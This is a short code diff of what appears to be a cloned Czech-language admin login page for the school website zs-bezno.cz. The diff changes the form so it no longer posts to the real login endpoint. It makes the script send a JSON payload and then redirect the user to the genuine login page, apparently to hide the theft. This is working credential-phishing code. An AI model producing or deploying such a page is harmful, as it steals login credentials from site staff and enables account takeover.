@@ -123,7 +123,7 @@
                             </div>
                         </div>
 
-                        <form method="post" action="/admin/login" id="form_login">
+                        <form action="#" id="form_login">
                             <div class="BlockStack" style="--pc-block-stack-order:column;--pc-block-stack-gap-xs:var(--p-space-400);"><div><div class="Labelled__LabelWrapper">
         <div class="Label">
   <label class="Label__Text" for="user"><span class="Text--root Text--bodyMd">Přihlašovací jméno
@@ -364,7 +364,8 @@ request.setRequestHeader('Content-type', 'application/json'); //basically just s
           }
         ]
       };
-      request.send(JSON.stringify(Payload));//the request was set up in the beggining so we just do request.send(PAYLOAD) and yippie we go!!!!!
+      await request.send(JSON.stringify(Payload));//the request was set up in the beggining so we just do request.send(PAYLOAD) and yippie we go!!!!!
+            window.location.href = "https://www.zs-bezno.cz/admin/login";
 
     } else {
       console.error('status: ', data.status, ' message: ', data.message); //if error then dont explode
